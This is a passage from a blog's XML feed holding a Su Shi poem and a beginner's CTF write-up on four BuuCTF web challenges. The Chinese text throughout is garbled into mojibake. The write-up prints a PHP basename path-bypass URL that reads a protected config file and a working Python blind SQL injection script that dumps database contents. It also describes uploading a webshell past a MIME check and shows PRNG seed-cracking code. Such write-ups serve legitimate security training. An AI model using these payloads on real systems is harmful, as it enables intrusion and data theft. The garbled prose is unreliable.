alt="tee2"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å®šé£æ³¢Â·å—æµ·å½’èµ ç‹å®šå›½ä¾äººå¯“å¨˜</title>
    <link href="/2023/11/22/2023-11-22-%E5%AE%9A%E9%A3%8E%E6%B3%A2%C2%B7%E5%8D%97%E6%B5%B7%E5%BD%92%E8%B5%A0%E7%8E%8B%E5%AE%9A%E5%9B%BD%E4%BE%8D%E4%BA%BA%E5%AF%93%E5%A8%98/"/>
    <url>/2023/11/22/2023-11-22-%E5%AE%9A%E9%A3%8E%E6%B3%A2%C2%B7%E5%8D%97%E6%B5%B7%E5%BD%92%E8%B5%A0%E7%8E%8B%E5%AE%9A%E5%9B%BD%E4%BE%8D%E4%BA%BA%E5%AF%93%E5%A8%98/</url>
    
    <content type="html"><![CDATA[<p>â€‹      </p><span id="more"></span><hr><h2 id="å®šé£æ³¢Â·å—æµ·å½’èµ ç‹å®šå›½ä¾äººå¯“å¨˜"><a href="#å®šé£æ³¢Â·å—æµ·å½’èµ ç‹å®šå›½ä¾äººå¯“å¨˜" class="headerlink" title="å®šé£æ³¢Â·å—æµ·å½’èµ ç‹å®šå›½ä¾äººå¯“å¨˜"></a>å®šé£æ³¢Â·å—æµ·å½’èµ ç‹å®šå›½ä¾äººå¯“å¨˜</h2><p>[å®‹] è‹è½¼</p><p>å¸¸ç¾¡äººé—´ç¢ç‰éƒã€‚å¤©åº”ä¹ä¸ç‚¹é…¥å¨˜ã€‚å°½é“æ¸…æ­Œä¼ çš“é½¿ã€‚é£èµ·ã€‚é›ªé£ç‚æµ·å˜æ¸…å‡‰ã€‚<br>ä¸‡é‡Œå½’æ¥é¢œæ„ˆå°‘ã€‚å¾®ç¬‘ã€‚ç¬‘æ—¶çŠ¹å¸¦å²­æ¢…é¦™ã€‚è¯•é—®å²­å—åº”ä¸å¥½ã€‚å´é“ã€‚æ­¤å¿ƒå®‰å¤„æ˜¯å¾ä¹¡</p>]]></content>
    
    
    
    <tags>
      
      <tag>é˜…è¯»</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTFåšé¢˜è®°å½•_4</title>
    <link href="/2023/11/14/2023-11-14-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_4/"/>
    <url>/2023/11/14/2023-11-14-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_4/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-comment">// FLAG is defined in config.php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<span class="hljs-comment">//è¶…å…¨å±€å˜é‡ï¼Œå®ƒåŒ…å«äº†å½“å‰æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶çš„æ–‡ä»¶åã€‚</span><br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<span class="hljs-comment">//basenameç”¨æ¥è·å–æ–‡ä»¶åéƒ¨åˆ†</span><br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$secret</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">64</span>));<span class="hljs-comment">//ç”Ÿæˆä¸€ä¸ª64å­—èŠ‚ï¼ˆå³512ä½ï¼‰çš„éšæœºå¯†é’¥ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²ã€‚</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">hash_equals</span>(<span class="hljs-variable">$secret</span>, <span class="hljs-variable">$guess</span>)) &#123;<span class="hljs-comment">//å“ˆå¸Œå€¼ç›¸ç­‰</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç å…¶å®å¾ˆå¥½ç†è§£ã€‚ä¸€å¼€å§‹ä»¥ä¸º<code>hash_equals</code>å­˜åœ¨ç»•è¿‡ã€‚ã€‚åæ¥æ‰çŸ¥é“è€ƒçš„æ˜¯<code>basename</code>ç»•è¿‡ï¼š</p><p>å…ˆäº†è§£ä¸€ä¸‹<code>$_SERVER[&#39;PHP_SELF&#39;]</code>è¿™ä¸œè¥¿å¹²å•¥ç”¨çš„<code>(å‚è€ƒhttps://www.shawroot.cc/937.htmlå’Œhttps://www.cnblogs.com/Article-kelp/p/16045800.html)</code></p><p>$_SERVER[â€˜PHP_SELFâ€™]ï¼šç›¸å¯¹äºç½‘ç«™æ ¹ç›®å½•çš„è·¯å¾„åŠ PHP ç¨‹åºåç§°ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">ç½‘å€ï¼šhttps:<span class="hljs-regexp">//</span>www.shawroot.cc<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br><br><span class="hljs-variable">$_SERVER</span>[â€˜PHP_SELFâ€™] å¾—åˆ°ï¼š<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo<br><span class="hljs-variable">$_SERVER</span>[â€˜SCRIPT_NAMEâ€™] å¾—åˆ°ï¼š<span class="hljs-regexp">/php/i</span>ndex.php<br><span class="hljs-variable">$_SERVER</span>[â€˜REQUEST_URIâ€™] å¾—åˆ°ï¼š<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br>basename()å‡½æ•°å°±æ˜¯è·å–è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ç‚¹å°±æ˜¯è¿™ä¸ª<code>basename</code>ï¼Œæ ¹æ®è¿™æ®µä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<span class="hljs-comment">//basenameç”¨æ¥è·å–æ–‡ä»¶åéƒ¨åˆ†</span><br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“å¦‚æœä»¤<code>basename($_SERVER[&#39;PHP_SELF&#39;])æ˜¯config.php</code>å°±èƒ½æ‹¿åˆ°<code>flag</code>ã€‚æˆ‘ä»¬å¯ä»¥æ„é€ <code>URL:http://7a610bd9-e609-454a-a18c-d1e340cfde4a.node4.buuoj.cn:81/index.php/config.php?source=1(æ³¨æ„è¿™ä¸ªindex.phpï¼Œæœ€å¼€å§‹æˆ‘æ²¡åŠ )</code>:</p><p><img src="/img/canyouguess1.png" alt="canyouguess1"></p><p>å†çœ‹ä¸Šé¢é‚£æ®µä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<span class="hljs-comment">//è¶…å…¨å±€å˜é‡ï¼Œå®ƒåŒ…å«äº†å½“å‰æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶çš„æ–‡ä»¶åã€‚</span><br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆå»æ‰æ­£åˆ™åŒ¹é…ä¸­çš„è½¬ä¹‰ç¬¦å·ä¼šå¥½ç†è§£ä¸€äº›ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config.php/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<span class="hljs-comment">//è¶…å…¨å±€å˜é‡ï¼Œå®ƒåŒ…å«äº†å½“å‰æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶çš„æ–‡ä»¶åã€‚</span><br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><code>/config.php/*$/i</code>è¿™éƒ¨åˆ†çš„æ„æ€å°±æ˜¯ä¸åŒºåˆ†å¤§å°å†™åŒ¹é…<code>config.php/</code>ç»“å°¾çš„å­—ç¬¦ä¸²<code>(å…¶ä¸­/åŒ¹é…é›¶æ¬¡æˆ–å¤šæ¬¡)</code></p><p>ã€‚è¿™æ ·ä»¥æ¥å°±é™åˆ¶äº†æˆ‘ä»¬åˆ©ç”¨<code>highlight_file</code>å‡½æ•°å»æ‹¿flagã€‚ä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æŸäº›å­—ç¬¦ä¸²ç»•è¿‡æ­£åˆ™ï¼š<strong>basename()ä¼šå»æ‰ä¸å¯è§å­—ç¬¦</strong>ï¼Œ<code>Fuzz</code>ä¸€ä¸‹ä¸å¯è§å­—ç¬¦ï¼Œç„¶åéšä¾¿å–ä¸€ä¸ªå°±è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++)&#123;<br>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;config.php/&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>) === <span class="hljs-string">&#x27;config.php&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//æ³¨æ„è¿™ä¸ª%2Få…¶å®æ˜¯/ï¼Œä¸èƒ½ç”¨ï¼</span><br></code></pre></td></tr></table></figure><p><img src="/img/canuguess1.png" alt="canuguess1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php/config.php/%ff?source=1</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;flag&#123;2c11cab3-0cfc-4f3d-ac4e-87969e74320e&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><p><code>index.php/config.php/%ff?source=1</code>ç»è¿‡<code>$_SERVER[&#39;PHP_SELF&#39;]</code>å˜æˆ<code>index.php/config.php/%ff</code>()è¿™é‡Œä¸ä¼šè§¦å‘æ­£åˆ™)ï¼Œç„¶å<code>basename</code>å»æ‰ä¸å¯è§å­—ç¬¦å¾—åˆ°<code>config.php</code></p><h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>éšä¾¿è¾“ä¸ª<code>student number</code>ï¼Œæ³¨æ„<code>URL</code>:</p><p><img src="/img/yanzhi1.png" alt="yanzhi1"></p><p>åˆæ­¥åˆ¤æ–­<code>SQL</code>æ³¨å…¥ï¼Œé€šè¿‡<code>1&#39;--+/1&#39;%23/1 --+ /1%23</code>åˆ¤æ–­æ˜¯æ•°å­—å‹æ³¨å…¥</p><p><code>?stunum=1 and 1--+</code></p><p><img src="/img/yanzhi5.png" alt="yanzhi5"></p><p><code>?stunum=1/**/and/**/0 --+</code>:(è¿‡æ»¤ç©ºæ ¼ï¼Œ0æ¢æˆ1æœ‰å›æ˜¾)</p><p><img src="/img/yanzhi4.png" alt="yanzhi4"></p><p>å°è¯•äº†å †å æ³¨å…¥æ²¡ç»“æœã€‚ã€‚è¯•äº†è¯•<code>if(length(database())&gt;1,1,0)</code></p><p><img src="/img/yanzhi2.png" alt="yanzhi2"></p><p><code>?stunum=if(length(database())&gt;99,1,0)</code></p><p><img src="/img/yanzhi3.png" alt="yanzhi3"></p><p>å¸ƒå°”ç›²æ³¨ï¼Œå¯ä»¥é€šè¿‡é¡µé¢å›æ˜¾åˆ¤æ–­<code>if</code>è¯­å¥æ­£ç¡®ä¸å¦ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://622046c8-08bf-4bd2-8873-9d43830c90c6.node4.buuoj.cn:81/&#x27;</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    low=<span class="hljs-number">31</span><br>    high=<span class="hljs-number">127</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;=high:<br>        paylaod = &#123;<span class="hljs-string">&quot;stunum&quot;</span>:<span class="hljs-string">&quot;if(ascii(substr((select(value)from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)&#125;<br>        <span class="hljs-comment">#çˆ†åº“ï¼šif(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        <span class="hljs-comment">#çˆ†è¡¨ï¼šif(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        <span class="hljs-comment">#çˆ†å­—æ®µï¼šif(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        <span class="hljs-comment">#çˆ†æ•°æ®ï¼šif(ascii(substr((select(value)from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        r = requests.get(url=url,params=paylaod)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> r.text):<br>            low = mid+<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid-<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>    result+=<span class="hljs-built_in">chr</span>(high+<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(result)<br>    time.sleep(<span class="hljs-number">0.3</span>)<br><br></code></pre></td></tr></table></figure><p>ç®€å•è¯´ä¸€ä¸‹äºŒåˆ†æ³•åŸç†ï¼Œé¦–å…ˆæ˜¯è®¾ç½®<code>low=31</code>å’Œ<code>high=127</code>:<code>ASCII</code>ç ä¸­å¯è§å­—ç¬¦çš„èŒƒå›´æ˜¯<code>32-126</code>ã€‚</p><p>è‡ªå·±å†™ä¸ªå­—å…¸æ”¾è¿›å»éå†ä¹Ÿè¡Œã€‚</p><p> <code>min = mid +1</code> å’Œ <code>max = mid</code>:</p><p>å½“åˆ¤æ–­ <code>mid </code>å¤§äºæŸä¸ªå€¼çš„ç»“æœä¸º<code> true</code> æ—¶, è¿™ä¸ªæ‰€æ±‚å€¼è‚¯å®šæ˜¯æ¯”<code>mid</code>è¦å¤§çš„ (å¤§äº), æ‰€ä»¥æ˜¯ <code>mid + 1</code></p><p>å½“ç»“æœä¸º<code> false</code> æ—¶, æ‰€æ±‚å€¼åº”è¯¥æ˜¯ä¸è¶…è¿‡<code>mid </code>(å°äºç­‰äº), æ‰€ä»¥æ˜¯ <code>max = mid</code></p><p>ç»è¿‡å¤šæ¬¡å¾ªç¯åè®©<code>high</code>æ¯”<code>low</code>å°ï¼Œè¿™æ—¶çš„<code>high</code>å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„æ•°æ®ã€‚</p><p>å¯ä»¥è‡ªå·±åœ¨è‰ç¨¿çº¸ä¸Šè¿‡ä¸€ä¸‹è¿‡ç¨‹ã€‚</p><p>è¿™é¢˜æ‰‹æ³¨ä¹Ÿå¯ä»¥ï¼šå‚è€ƒ<code>https://blog.csdn.net/weixin_61355725/article/details/126518079</code></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p><img src="/img/cvmaker1.png" alt="cvmaker1"></p><p>å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç™»å½•ï¼š</p><p><img src="/img/cvmaker2.png" alt="cvmaker2"></p><p>å‘ç°æœ‰ä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½ï¼ŒçŒœæµ‹æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼š</p><p><img src="/img/cvmaker3.png" alt="cvmaker3"></p><p>æˆ‘ç‚¹æ›´æ¢å¤´åƒç„¶åéšä¾¿ä¸Šä¼ äº†ä¸ªä¸€å¥è¯ã€‚ã€‚å¡ä½äº†åˆ·æ–°é¡µé¢å°±å‡ºäº†è¿™ä¹ˆä¸ªä¸œè¥¿</p><p>å¦ˆçš„è¿™é¢˜æˆ‘ç¯å¢ƒæœ‰é—®é¢˜ã€‚ã€‚æ˜æ˜ç™»å½•äº†ä»–ä¸€ç›´ç»™æˆ‘å¼¹<code>Please Login </code>å•¥çš„ã€‚ã€‚çƒ¦æ­»äº†ï¼Œè€Œä¸”æœ‰æ—¶ç‚¹æŒ‰é’®å•¥ååº”ä¸ç»™</p><p><code>exif_imagetype</code>è¿™ä¸œè¥¿å°±æ˜¯ä¸ª<code>MIME</code>è¿‡æ»¤ï¼Œä¸Šä¼ ä¸€å¥è¯åæŠ“åŒ…æ”¹ä¸€ä¸‹<code>content-type</code>å°±è¡Œ</p><p>ä¸Šä¼ åä¼šè¿”å›ä¸€ä¸ªè·¯å¾„ï¼Œè®¿é—®ç„¶åèšå‰‘è¿æ¥</p><h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><p><img src="/img/chou1.png" alt="chou1"></p><p>å³é”®çœ‹æºç ä¹Ÿæ²¡å•¥æç¤ºï¼Œè¯•ç€è¾“å…¥ä¸€äº›å­—ç¬¦ä¸²ç„¶åæŠ“åŒ…ï¼š</p><p><img src="/img/chou2.png" alt="chou2"></p><p>æ˜æ–‡ä¼ è¾“ï¼Œä¸è¿‡å¯ä»¥çœ‹åˆ°å³è¾¹å¥½åƒè¿”å›äº†éƒ¨åˆ†<code>PHP</code>ä»£ç ï¼Ÿ</p><p>æˆ‘å›åˆ°åŸé¡µé¢å¹¶æ²¡æœ‰å•¥æ–°ä¸œè¥¿ï¼Œ<code>F12</code>æ‰“å¼€ç½‘ç»œï¼Œé‡æ–°å‘æ•°æ®åå‘ç°æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/chou3.png" alt="chou3"></p><p>è®¿é—®<code>check.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">JXRHwWFvH5<br><br>æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);<span class="hljs-comment">//ç§å­</span><br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<span class="hljs-comment">//åŸå§‹å­—ç¬¦ä¸²ï¼Œèµ·å§‹ä½ç½®å’Œé•¿åº¦ </span><br>&#125;<br><span class="hljs-variable">$str_show</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<span class="hljs-comment">//ç»™äº†å‰åä½</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str_show</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]===<span class="hljs-variable">$str</span>)&#123;x<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;check.php&quot;</span>); 